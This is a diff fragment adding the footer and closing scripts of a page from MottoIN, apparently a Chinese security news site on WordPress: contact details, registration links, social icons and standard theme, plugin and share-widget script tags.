+                    Copyright © 2017 MottoIN 版权所有 <a href="http://www.miibeian.gov.cn/">沪ICP备16010654号-5</a>  <img class="alignnone " src="http://www.mottoin.com/img/mottoin/ga.png" width="16" height="16" /> <a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=31010402001331">沪公网安备31010402001331号</a>                 </div>
+            </div>
+            <div class="footer-col footer-col-sns">
+                <div class="footer-sns">
+                                                                                    <a class="sns-wx" href="javascript:;">
+                            <i class="fa fa-weixin"></i>
+                            <span style="background-image:url(http://www.mottoin.com/img/mottoin/weixin.jpg);"></span>
+                        </a>
+                                                                <a target="_blank" href="http://weibo.com/mottoin" rel="nofollow"><i class="fa fa-weibo"></i></a>
+                                                                <a target="_blank" href="http://weibo.com/mottoin" rel="nofollow"><i class="fa fa-tencent-weibo"></i></a>
+                                                                                                                                                                                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+<div class="action" style="top:50%;">
+            <div class="a-box contact">
+            <div class="contact-wrap">
+                <h3 class="contact-title">联系我们</h3>
+                <h4 style="text-align: center;"><span style="color: #2d6ded;"><strong>021-62666911</strong></span></h4>
+<p>在线咨询：<a href="http://wpa.qq.com/msgrd?uin=19539638" target="_blank" rel="noopener"><img class="alignnone" title="点击这里给我发消息" src="http://wpa.qq.com/pa?p=2:1666839010:51" alt="点击这里给我发消息" border="0" /></a></p>
+<p>邮件：root@mottoin.com</p>
+<p>工作时间：周一至周五，9:30-18:30，节假日休息</p>
+            </div>
+        </div>
+                <div class="a-box wechat">
+            <div class="wechat-wrap">
+                <img src="http://www.mottoin.com/img/mottoin/weixin.jpg" alt="QR code">
+            </div>
+        </div>
+            <div class="a-box gotop" id="j-top" style="display: none;"></div>
+</div>
+<style>.footer{padding-bottom: 35px;}</style><div id="um_upload_single" style="display:none">
+	
+</div><div id="um_view_photo" style="display:none">
+
+	<a href="#" data-action="um_remove_modal" class="um-modal-close"><i class="um-faicon-times"></i></a>
+	
+	<div class="um-modal-body photo">
+	
+		<div class="um-modal-photo">
+
+		</div>
+
+	</div>
+	
+</div><script type='text/javascript'>
+/* <![CDATA[ */
+var _wpcom_js = {"ajaxurl":"http:\/\/www.mottoin.com\/wp-admin\/admin-ajax.php"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://www.mottoin.com/wp-content/themes/JustNews/js/main.js?ver=2.3.2'></script>
+<script type='text/javascript' src='http://www.mottoin.com/wp-includes/js/comment-reply.min.js?ver=4.8.1'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var wpcom_qa_js = {"ajaxurl":"http:\/\/www.mottoin.com\/wp-admin\/admin-ajax.php","ajaxloading":"http:\/\/www.mottoin.com\/wp-content\/plugins\/wpcom-qa\/images\/loading.gif"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://www.mottoin.com/wp-content/plugins/wpcom-qa/js/scripts.min.js?ver=1.0'></script>
+<script type='text/javascript' src='http://www.mottoin.com/wp-includes/js/imagesloaded.min.js?ver=3.2.0'></script>
+<script type='text/javascript' src='http://www.mottoin.com/wp-includes/js/masonry.min.js?ver=3.3.2'></script>
+<script type='text/javascript' src='http://www.mottoin.com/wp-includes/js/jquery/jquery.masonry.min.js?ver=3.1.2b'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var um_scripts = {"ajaxurl":"http:\/\/www.mottoin.com\/wp-admin\/admin-ajax.php","fileupload":"http:\/\/www.mottoin.com\/wp-content\/plugins\/ultimate-member\/core\/lib\/upload\/um-file-upload.php","imageupload":"http:\/\/www.mottoin.com\/wp-content\/plugins\/ultimate-member\/core\/lib\/upload\/um-image-upload.php"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://www.mottoin.com/wp-content/plugins/ultimate-member/assets/js/um.min.js?ver=10.3.88'></script>
+<script type='text/javascript' src='http://www.mottoin.com/wp-content/plugins/ultimate-member/assets/js/pickadate/translations/zh_CN.js?ver=10.3.88'></script>
+<script type='text/javascript' src='http://www.mottoin.com/wp-includes/js/wp-embed.min.js?ver=4.8.1'></script>
+
+		<script type="text/javascript">jQuery( '#request' ).val( '' );</script>
+
+	    <script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":["mshare","tsina","weixin","qzone","sqq","douban","fbook","twi","bdhome","tqq","tieba","mail","youdao","print"],"bdPic":"","bdStyle":"1","bdSize":"16"},"share":[{"tag" : "single", "bdSize" : 16}, {"tag" : "global","bdSize" : 16,bdPopupOffsetLeft:-227}],url:'http://www.mottoin.com/wp-content/themes/JustNews'};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://www.mottoin.com/wp-content/themes/JustNews/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+</body>
+</html>
